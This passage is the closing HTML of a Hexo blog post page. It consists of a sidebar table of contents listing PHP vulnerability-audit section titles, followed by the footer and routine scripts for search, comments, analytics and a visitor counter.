href="#PHP自身函数漏洞及缺陷"><span class="nav-number">1.22.</span> <span class="nav-text">PHP自身函数漏洞及缺陷</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP函数的溢出漏洞"><span class="nav-number">1.23.</span> <span class="nav-text">PHP函数的溢出漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP函数的其他漏洞"><span class="nav-number">1.24.</span> <span class="nav-text">PHP函数的其他漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session-destroy-删除文件漏洞"><span class="nav-number">1.25.</span> <span class="nav-text">session_destroy()删除文件漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#随机函数"><span class="nav-number">1.26.</span> <span class="nav-text">随机函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#特殊字符"><span class="nav-number">1.27.</span> <span class="nav-text">特殊字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#截断"><span class="nav-number">1.28.</span> <span class="nav-text">截断</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#include截断"><span class="nav-number">1.28.1.</span> <span class="nav-text">include截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据截断"><span class="nav-number">1.28.2.</span> <span class="nav-text">数据截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件操作里的特殊字符"><span class="nav-number">1.28.3.</span> <span class="nav-text">文件操作里的特殊字符</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#怎么进一步寻找新的字典"><span class="nav-number">1.29.</span> <span class="nav-text">怎么进一步寻找新的字典</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DEMO"><span class="nav-number">1.30.</span> <span class="nav-text">DEMO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后话"><span class="nav-number">1.31.</span> <span class="nav-text">后话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#附录"><span class="nav-number">1.32.</span> <span class="nav-text">附录</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZEROYU</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">ZEROYU</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    bp.src = '//push.zhanzhang.baidu.com/push.js';
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"zeroyu.duoshuo.com"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    
+    <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("KY6fzHpNYVDAlWLyfhKdz5OA-gzGzoHsz", "IlxIqswmBd92jfiSvOIQSLf5");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+
+</body>
+</html>
